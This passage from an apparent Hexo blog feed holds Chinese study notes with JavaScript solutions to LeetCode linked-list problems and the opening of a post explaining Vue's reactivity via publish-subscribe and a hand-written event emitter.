operator">-</span><span class="token operator">></span>NULL</code></pre><ul><li>思路：成环再打开</li><li>遍历链表，找到链尾接环，记录链表长度 n</li><li>k = k % n ，找到断开位置 n-k </li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rotateRight <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head    <span class="token keyword">let</span> p <span class="token operator">=</span> head<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>next <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        p <span class="token operator">=</span> p<span class="token punctuation">.</span>next        n<span class="token operator">++</span>    <span class="token punctuation">}</span>    p<span class="token punctuation">.</span>next <span class="token operator">=</span> head    k <span class="token operator">=</span> k <span class="token operator">%</span> n    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">-</span>k<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        head <span class="token operator">=</span> head<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token keyword">let</span> tmp <span class="token operator">=</span> head    head <span class="token operator">=</span> head<span class="token punctuation">.</span>next    tmp<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span>    <span class="token keyword">return</span> head<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="两两交换链表元素"><a href="#两两交换链表元素" class="headerlink" title="两两交换链表元素"></a>两两交换链表元素</h2><ul><li><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/solution/" target="_blank" rel="noopener">leetcode24</a></p></li><li><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/solution/shou-hua-tu-jie-24-liang-liang-jiao-huan-lian-biao/" target="_blank" rel="noopener">题解</a></p></li></ul><pre class=" language-js"><code class="language-js">给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。示例 <span class="token number">1</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>示例 <span class="token number">2</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token punctuation">]</span>示例 <span class="token number">3</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> swapPairs <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dummy<span class="token punctuation">.</span>next <span class="token operator">=</span> head    <span class="token keyword">let</span> prev <span class="token operator">=</span> dummy    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&amp;&amp;</span> head<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> next <span class="token operator">=</span> head<span class="token punctuation">.</span>next        head<span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">.</span>next        next<span class="token punctuation">.</span>next <span class="token operator">=</span> head        prev<span class="token punctuation">.</span>next <span class="token operator">=</span> next        prev <span class="token operator">=</span> head        head <span class="token operator">=</span> head<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">}</span></code></pre><h2 id="环形链表"><a href="#环形链表" class="headerlink" title="环形链表"></a>环形链表</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">leetcode141</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">1</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第二个节点。示例 <span class="token number">2</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">0</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第一个节点。</code></pre><ul><li>快慢指针法</li><li>快、慢指针，从头节点出发</li><li>慢指针每次走一步，快指针每次走两步，不断比较它们指向的节点的值</li><li>如果节点值相同，说明有环。如果不同，继续循环。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> hasCycle <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> fast <span class="token operator">=</span> head  <span class="token keyword">let</span> slow <span class="token operator">=</span> head  <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next                     fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>   <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 如果对象中存在循环引用，则 JSON.stringify 报错</span><span class="token keyword">var</span> hasCycle <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="环形链表2"><a href="#环形链表2" class="headerlink" title="环形链表2"></a>环形链表2</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/" target="_blank" rel="noopener">leetcode142</a></li><li>相比上一题需要找到环形入口，具体可参考题解<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/141ti-de-kuo-zhan-ru-guo-lian-biao-you-huan-ru-he-/" target="_blank" rel="noopener">「手画图解+公式推导」链表有环，如何求入环点？</a></li><li>这种方法自己怎么可能想出来呀。。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> detectCycle <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> slow <span class="token operator">=</span> head    <span class="token keyword">let</span> fast <span class="token operator">=</span> head    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next            fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next        <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>              fast <span class="token operator">=</span> head                  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token keyword">return</span> slow          slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next          fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next            <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="删除链表的倒数第n个结点"><a href="#删除链表的倒数第n个结点" class="headerlink" title="删除链表的倒数第n个结点"></a>删除链表的倒数第n个结点</h2><ul><li><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">leetcode19</a></li></ul><pre class=" language-js"><code class="language-js">给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。示例：给定一个链表<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">,</span> 和 n <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">.</span>当删除了倒数第二个节点后，链表变为 <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">.</span></code></pre><ul><li>思路：双指针，快的先走 n 步，然后两个一起走到最后，慢的就是倒数第 n 个，只遍历了一次</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeNthFromEnd <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 创建头节点, 保证输入为 [1], 1 时，不会出现错误</span>    <span class="token keyword">let</span> pre <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    pre<span class="token punctuation">.</span>next <span class="token operator">=</span> head    <span class="token keyword">let</span> slow <span class="token operator">=</span> pre    <span class="token keyword">let</span> fast <span class="token operator">=</span> pre    <span class="token comment" spellcheck="true">// fast 先走 n 次</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 走到尾部</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 删除</span>    slow<span class="token punctuation">.</span>next <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next    <span class="token keyword">return</span> pre<span class="token punctuation">.</span>next<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="合并两个有序链表"><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h2><ul><li><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">leetcode21</a></li></ul><pre class=" language-js"><code class="language-js">将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例：输入：<span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span>输出：<span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> mergeTwoLists <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l2    <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l1    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        l1<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">.</span>next<span class="token punctuation">,</span> l2<span class="token punctuation">)</span>        <span class="token keyword">return</span> l1    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        l2<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token keyword">return</span> l2    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="合并k个有序链表"><a href="#合并k个有序链表" class="headerlink" title="合并k个有序链表"></a>合并k个有序链表</h2><ul><li><a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/" target="_blank" rel="noopener">leetcode23</a></li></ul><pre class=" language-js"><code class="language-js">给你一个链表数组，每个链表都已经按升序排列。请你将所有链表合并到一个升序链表中，返回合并后的链表。示例 <span class="token number">1</span>：输入：lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>解释：链表数组如下：<span class="token punctuation">[</span>  <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">]</span>将它们合并到一个有序链表中得到。<span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span>示例 <span class="token number">2</span>：输入：lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token punctuation">]</span>示例 <span class="token number">3</span>：输入：lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><ul><li>分治：把 k 个链表拆分，利用合并两个链表来操作</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> mergeKLists <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>lists<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>lists<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>lists<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> lists<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>lists<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>lists<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> lists<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">const</span> mid <span class="token operator">=</span> lists<span class="token punctuation">.</span>length <span class="token operator">></span><span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> l1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mid<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">const</span> l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> mid<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lists<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    l2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span><span class="token function">mergeKLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mergeKLists</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="链表反转"><a href="#链表反转" class="headerlink" title="链表反转"></a>链表反转</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Reverse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> pre<span class="token operator">=</span><span class="token keyword">null</span>    <span class="token keyword">let</span> next<span class="token operator">=</span><span class="token keyword">null</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        next<span class="token operator">=</span>p<span class="token punctuation">.</span>next        p<span class="token punctuation">.</span>next<span class="token operator">=</span>pre <span class="token comment" spellcheck="true">//反转指针</span>        pre<span class="token operator">=</span>p              p<span class="token operator">=</span>next    <span class="token punctuation">}</span>  <span class="token keyword">return</span> pre<span class="token punctuation">}</span></code></pre><h2 id="给一个链表，输出链表中倒数第k个结点"><a href="#给一个链表，输出链表中倒数第k个结点" class="headerlink" title="给一个链表，输出链表中倒数第k个结点"></a>给一个链表，输出链表中倒数第k个结点</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">{</span>    arr<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    head<span class="token operator">=</span>head<span class="token punctuation">.</span>next<span class="token punctuation">}</span><span class="token keyword">return</span> arr<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue响应式原理详解</title>
      <link href="2020/11/12/Vue-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/11/12/Vue-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<ul><li>发布订阅模式</li><li>观察者模式</li><li>Vue 实例初始化过程</li><li>组件渲染过程</li><li>响应式过程总结</li><li>Vue 3.0 Proxy</li></ul><h3 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h3><ul><li>订阅者</li><li>发布者</li><li>信号中心</li></ul><blockquote><p>假定存在一个信号中心，某个任务执行完成，就向信号中心发布一个信号，其他任务可以向信号中心订阅这个信号，从而知道自己什么时候自己可以开始执行。</p></blockquote><h3 id="Vue的自定义事件"><a href="#Vue的自定义事件" class="headerlink" title="Vue的自定义事件"></a>Vue的自定义事件</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 注册事件</span>vm<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'dataChange'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dataChange'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>vm<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'dataChange'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dataChange1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 发起事件</span>vm<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'dataChange'</span><span class="token punctuation">)</span></code></pre><h4 id="兄弟组件通信过程"><a href="#兄弟组件通信过程" class="headerlink" title="兄弟组件通信过程"></a>兄弟组件通信过程</h4><p><strong>两个组件不相互依赖，即发布者和订阅者被事件中心隔离</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 信号中心</span><span class="token keyword">let</span> eventHub <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ComponentA.vue</span><span class="token comment" spellcheck="true">// 发布者</span>addTodo<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 发布事件</span>    eventHub<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'add-todo'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>newTodoText <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>newTodoText <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// ComponentB.vue</span><span class="token comment" spellcheck="true">// 订阅者</span>created<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 订阅事件</span>    eventHub<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'add-todo'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>addTodo<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="模拟实现vue的自定义事件"><a href="#模拟实现vue的自定义事件" class="headerlink" title="模拟实现vue的自定义事件"></a>模拟实现vue的自定义事件</h4><pre class=" language-js"><code class="language-js">    <span class="token comment" spellcheck="true">// 类内部存储一个对象，包含事件名和对应的触发函数</span>    <span class="token comment" spellcheck="true">// { click: [fn1, fn2], change: fn }</span>    <span class="token keyword">class</span> <span class="token class-name">EventEmitter</span> <span class="token punctuation">{</span>      constructor <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 注册事件</span>      $on <span class="token punctuation">(</span>eventType<span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 触发事件</span>      $emit <span class="token punctuation">(</span>eventType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">[</span>eventType<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">foreach</span><span class="token punctuation">(</span>handler <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token function">handler</span><span class="token 